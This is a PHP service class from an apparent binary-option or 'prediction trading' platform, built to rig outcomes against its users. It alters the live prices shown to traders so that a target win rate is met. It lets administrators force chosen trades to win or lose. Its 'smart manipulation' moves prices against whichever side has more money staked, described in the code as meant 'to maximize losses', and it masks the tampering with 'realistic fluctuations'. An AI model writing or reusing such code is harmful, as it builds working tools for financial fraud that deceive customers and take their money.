<?php

namespace App\Services;

use App\Models\TradingAsset;
use App\Models\PredictionTrade;
use App\Models\TradeSetting;
use App\Models\TradeOverride;
use App\Models\Admin;
use Carbon\Carbon;

class PriceManipulationService
{
    /**
     * Get manipulated price for real-time price updates
     */
    public function getManipulatedPrice(float $realPrice, int $assetId): float
    {
        try {
            $spreadPercentage = TradeSetting::getSetting('price_spread_percentage', 0.02);
            $manipulationIntensity = TradeSetting::getSetting('manipulation_intensity', 0.1);
            
            // Check if emergency stop is enabled
            if (TradeSetting::getSetting('emergency_trading_stop', false)) {
                return $realPrice; // No manipulation during emergency stop
            }
            
            // Get current win rate and target
            $winRateService = new WinRateControlService();
            $currentWinRate = $winRateService->getCurrentWinRate();
            $targetWinRate = $winRateService->getTargetWinRate();
            
            // Calculate manipulation adjustment based on win rate difference
            $winRateDiff = $currentWinRate - $targetWinRate;
            $adjustment = $winRateDiff * $manipulationIntensity;
            
            // Apply random fluctuation within spread
            $randomSpread = (rand(-100, 100) / 10000) * $spreadPercentage;
            
            // Combine adjustments
            $totalAdjustment = ($adjustment + $randomSpread) / 100;
            $manipulatedPrice = $realPrice * (1 + $totalAdjustment);
            
            // Ensure price doesn't deviate too much (max 2% from real price)
            $maxDeviation = 0.02;
            $minPrice = $realPrice * (1 - $maxDeviation);
            $maxPrice = $realPrice * (1 + $maxDeviation);
            
            return max($minPrice, min($maxPrice, $manipulatedPrice));
            
        } catch (\Exception $e) {
            // Return real price if manipulation fails
            return $realPrice;
        }
    }

    /**
     * Manually manipulate asset price for specific trade outcome
     */
    public function manipulatePrice(int $assetId, float $newPrice, string $reason, int $adminId): array
    {
        try {
            $asset = TradingAsset::findOrFail($assetId);
            $originalPrice = $asset->current_price;
            
            // Update asset price
            $asset->update(['current_price' => $newPrice]);
            
            // Update all active trades for this asset
            $activeTrades = PredictionTrade::forAsset($assetId)->active()->get();
            
            foreach ($activeTrades as $trade) {
                $trade->updateCurrentPrice($newPrice);
                
                // Create override record
                TradeOverride::createPriceManipulation(
                    $trade->id,
                    $adminId,
                    $newPrice,
                    $reason
                );
            }

            return [
                'success' => true,
                'message' => "Price manipulated from $" . number_format($originalPrice, 4) . 
                           " to $" . number_format($newPrice, 4),
                'affected_trades' => $activeTrades->count()
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to manipulate price: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Force a specific trade to win
     */
    public function forceTradeWin(int $tradeId, string $reason, int $adminId): array
    {
        try {
            $trade = PredictionTrade::findOrFail($tradeId);
            
            if (!$trade->isActive()) {
                return [
                    'success' => false,
                    'message' => 'Trade is not active'
                ];
            }

            // Create override record
            $override = TradeOverride::createForceWin($tradeId, $adminId, $reason);
            $override->apply();

            return [
                'success' => true,
                'message' => 'Trade forced to win',
                'trade' => $trade->fresh()
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to force trade win: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Force a specific trade to lose
     */
    public function forceTradeLoss(int $tradeId, string $reason, int $adminId): array
    {
        try {
            $trade = PredictionTrade::findOrFail($tradeId);
            
            if (!$trade->isActive()) {
                return [
                    'success' => false,
                    'message' => 'Trade is not active'
                ];
            }

            // Create override record
            $override = TradeOverride::createForceLoss($tradeId, $adminId, $reason);
            $override->apply();

            return [
                'success' => true,
                'message' => 'Trade forced to lose',
                'trade' => $trade->fresh()
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to force trade loss: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Apply smart price manipulation based on trade predictions
     */
    public function smartManipulation(int $assetId, int $adminId, float $intensity = null): array
    {
        try {
            $asset = TradingAsset::findOrFail($assetId);
            $activeTrades = PredictionTrade::forAsset($assetId)->active()->get();
            
            if ($activeTrades->isEmpty()) {
                return [
                    'success' => false,
                    'message' => 'No active trades found for this asset'
                ];
            }

            $intensity = $intensity ?? TradeSetting::getManipulationIntensity();
            
            // Analyze trade predictions
            $upTrades = $activeTrades->where('prediction', 'UP');
            $downTrades = $activeTrades->where('prediction', 'DOWN');
            
            $upAmount = $upTrades->sum('trade_amount');
            $downAmount = $downTrades->sum('trade_amount');
            
            // Determine manipulation direction based on loss maximization
            $targetDirection = $upAmount > $downAmount ? 'DOWN' : 'UP';
            
            // Calculate price change
            $currentPrice = (float) $asset->current_price;
            $changePercent = $intensity * (mt_rand(5, 15) / 10); // 0.5% to 1.5% change
            
            if ($targetDirection === 'UP') {
                $newPrice = $currentPrice * (1 + $changePercent / 100);
            } else {
                $newPrice = $currentPrice * (1 - $changePercent / 100);
            }

            // Apply the manipulation
            return $this->manipulatePrice(
                $assetId, 
                $newPrice, 
                "Smart manipulation to maximize losses (targeting {$targetDirection})", 
                $adminId
            );

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to apply smart manipulation: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Create realistic price fluctuations
     */
    public function createRealisticFluctuation(int $assetId): array
    {
        try {
            $asset = TradingAsset::findOrFail($assetId);
            $currentPrice = (float) $asset->current_price;
            
            // Create small realistic fluctuation (0.1% to 0.5%)
            $changePercent = mt_rand(1, 5) / 1000; // 0.001 to 0.005
            $direction = mt_rand(0, 1) ? 1 : -1;
            
            $newPrice = $currentPrice * (1 + ($direction * $changePercent));
            
            // Update price
            $asset->update(['current_price' => $newPrice]);
            
            // Update active trades
            $activeTrades = PredictionTrade::forAsset($assetId)->active()->get();
            foreach ($activeTrades as $trade) {
                $trade->updateCurrentPrice($newPrice);
            }

            return [
                'success' => true,
                'message' => 'Realistic fluctuation applied',
                'price_change' => $newPrice - $currentPrice,
                'new_price' => $newPrice
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to create fluctuation: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Get manipulation statistics
     */
    public function getManipulationStats(int $days = 7): array
    {
        $since = Carbon::now()->subDays($days);
        
        $overrides = TradeOverride::where('created_at', '>=', $since)
            ->with(['trade.user', 'admin'])
            ->get();

        $stats = [
            'total_overrides' => $overrides->count(),
            'force_wins' => $overrides->where('override_type', 'force_win')->count(),
            'force_losses' => $overrides->where('override_type', 'force_loss')->count(),
            'price_manipulations' => $overrides->where('override_type', 'price_manipulation')->count(),
            'affected_users' => $overrides->pluck('trade.user.id')->unique()->count(),
            'total_amount_affected' => $overrides->sum('trade.trade_amount')
        ];

        return $stats;
    }

    /**
     * Reverse a manipulation (if not yet applied)
     */
    public function reverseManipulation(int $overrideId): array
    {
        try {
            $override = TradeOverride::findOrFail($overrideId);
            
            if ($override->applied) {
                return [
                    'success' => false,
                    'message' => 'Cannot reverse an already applied manipulation'
                ];
            }

            // If it's a price manipulation, restore original price
            if ($override->override_type === 'price_manipulation' && $override->original_price) {
                $trade = $override->trade;
                $asset = $trade->tradingAsset;
                
                $asset->update(['current_price' => $override->original_price]);
                $trade->updateCurrentPrice((float) $override->original_price);
            }

            // Delete the override
            $override->delete();

            return [
                'success' => true,
                'message' => 'Manipulation reversed successfully'
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to reverse manipulation: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Auto-manipulation based on global settings
     */
    public function autoManipulate(): array
    {
        if (!TradeSetting::isManipulationEnabled()) {
            return [
                'success' => false,
                'message' => 'Auto-manipulation is disabled'
            ];
        }

        $results = [];
        $assets = TradingAsset::where('is_active', true)->get();
        
        foreach ($assets as $asset) {
            $activeTrades = PredictionTrade::forAsset($asset->id)->active()->count();
            
            if ($activeTrades > 0) {
                // 30% chance to apply manipulation per asset
                if (mt_rand(1, 100) <= 30) {
                    $result = $this->createRealisticFluctuation($asset->id);
                    $results[] = [
                        'asset' => $asset->symbol,
                        'result' => $result
                    ];
                }
            }
        }

        return [
            'success' => true,
            'message' => 'Auto-manipulation completed',
            'results' => $results
        ];
    }
}
